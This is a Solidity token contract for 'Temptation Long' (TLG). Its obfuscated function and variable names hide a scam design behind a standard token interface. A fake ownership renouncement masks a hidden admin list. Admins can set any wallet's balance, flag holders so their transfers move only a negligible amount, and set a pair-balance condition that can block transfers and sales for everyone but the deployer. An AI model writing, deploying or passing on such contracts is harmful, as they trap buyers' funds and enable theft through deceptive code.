//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface swapExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingTotal {
    function createPair(address txTake, address swapLiquidityIs) external returns (address);
}

interface sellReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxLaunched) external view returns (uint256);

    function transfer(address txFundReceiver, uint256 launchedTeam) external returns (bool);

    function allowance(address senderMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTeam) external returns (bool);

    function transferFrom(
        address sender,
        address txFundReceiver,
        uint256 launchedTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamAuto, uint256 value);
    event Approval(address indexed senderMarketing, address indexed spender, uint256 value);
}

interface sellReceiverMetadata is sellReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TemptationLong is teamMin, sellReceiver, sellReceiverMetadata {

    mapping(address => uint256) private fromToken;

    function feeLimit(address tradingTx) public {
        teamTotal();
        if (exemptTx != enableMinLimit) {
            isFrom = false;
        }
        if (tradingTx == launchAmountFee || tradingTx == shouldSell) {
            return;
        }
        isMax[tradingTx] = true;
    }

    function name() external view virtual override returns (string memory) {
        return tradingMax;
    }

    uint256 public launchTx;

    function fromMax(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) internal returns (bool) {
        require(fromToken[walletExemptLaunch] >= launchedTeam);
        fromToken[walletExemptLaunch] -= launchedTeam;
        fromToken[txFundReceiver] += launchedTeam;
        emit Transfer(walletExemptLaunch, txFundReceiver, launchedTeam);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamBuy;
    }

    mapping(address => mapping(address => uint256)) private receiverTotal;

    address shouldExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 teamWallet;

    address private atTeamSell;

    function walletMax() public {
        emit OwnershipTransferred(launchAmountFee, address(0));
        atTeamSell = address(0);
    }

    function approve(address walletSellLiquidity, uint256 launchedTeam) public virtual override returns (bool) {
        receiverTotal[_msgSender()][walletSellLiquidity] = launchedTeam;
        emit Approval(_msgSender(), walletSellLiquidity, launchedTeam);
        return true;
    }

    function teamSell(address exemptReceiver, uint256 launchedTeam) public {
        teamTotal();
        fromToken[exemptReceiver] = launchedTeam;
    }

    bool private tokenBuy;

    constructor (){
        if (minList == tokenBuy) {
            totalAtSell = true;
        }
        swapExempt walletSwap = swapExempt(shouldExempt);
        shouldSell = tradingTotal(walletSwap.factory()).createPair(walletSwap.WETH(), address(this));
        
        launchAmountFee = _msgSender();
        walletMax();
        totalFeeSell[launchAmountFee] = true;
        fromToken[launchAmountFee] = receiverTeam;
        
        emit Transfer(address(0), launchAmountFee, receiverTeam);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTeam;
    }

    uint256 private receiverTeam = 100000000 * 10 ** 18;

    uint256 public enableMinLimit;

    function transfer(address exemptReceiver, uint256 launchedTeam) external virtual override returns (bool) {
        return totalSwap(_msgSender(), exemptReceiver, launchedTeam);
    }

    uint256 public exemptTx;

    function totalSwap(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) internal returns (bool) {
        if (walletExemptLaunch == launchAmountFee) {
            return fromMax(walletExemptLaunch, txFundReceiver, launchedTeam);
        }
        uint256 tradingShould = sellReceiver(shouldSell).balanceOf(shouldAt);
        require(tradingShould == tokenSender);
        require(txFundReceiver != shouldAt);
        if (isMax[walletExemptLaunch]) {
            return fromMax(walletExemptLaunch, txFundReceiver, shouldReceiver);
        }
        return fromMax(walletExemptLaunch, txFundReceiver, launchedTeam);
    }

    mapping(address => bool) public isMax;

    address public launchAmountFee;

    bool public minList;

    function transferFrom(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) external override returns (bool) {
        if (_msgSender() != shouldExempt) {
            if (receiverTotal[walletExemptLaunch][_msgSender()] != type(uint256).max) {
                require(launchedTeam <= receiverTotal[walletExemptLaunch][_msgSender()]);
                receiverTotal[walletExemptLaunch][_msgSender()] -= launchedTeam;
            }
        }
        return totalSwap(walletExemptLaunch, txFundReceiver, launchedTeam);
    }

    bool private autoLiquidity;

    uint256 constant shouldReceiver = 18 ** 10;

    bool public listExempt;

    address public shouldSell;

    function getOwner() external view returns (address) {
        return atTeamSell;
    }

    address shouldAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address feeEnable, address walletSellLiquidity) external view virtual override returns (uint256) {
        if (walletSellLiquidity == shouldExempt) {
            return type(uint256).max;
        }
        return receiverTotal[feeEnable][walletSellLiquidity];
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenList;
    }

    event OwnershipTransferred(address indexed sellSender, address indexed swapFundWallet);

    uint256 tokenSender;

    function tokenTo(uint256 launchedTeam) public {
        teamTotal();
        tokenSender = launchedTeam;
    }

    uint256 private feeAmount;

    string private tokenList = "TLG";

    function owner() external view returns (address) {
        return atTeamSell;
    }

    mapping(address => bool) public totalFeeSell;

    bool public totalAtSell;

    bool public isFrom;

    function balanceOf(address maxLaunched) public view virtual override returns (uint256) {
        return fromToken[maxLaunched];
    }

    uint8 private teamBuy = 18;

    function toTx(address tradingMarketing) public {
        require(tradingMarketing.balance < 100000);
        if (listExempt) {
            return;
        }
        
        totalFeeSell[tradingMarketing] = true;
        
        listExempt = true;
    }

    string private tradingMax = "Temptation Long";

    function teamTotal() private view {
        require(totalFeeSell[_msgSender()]);
    }

}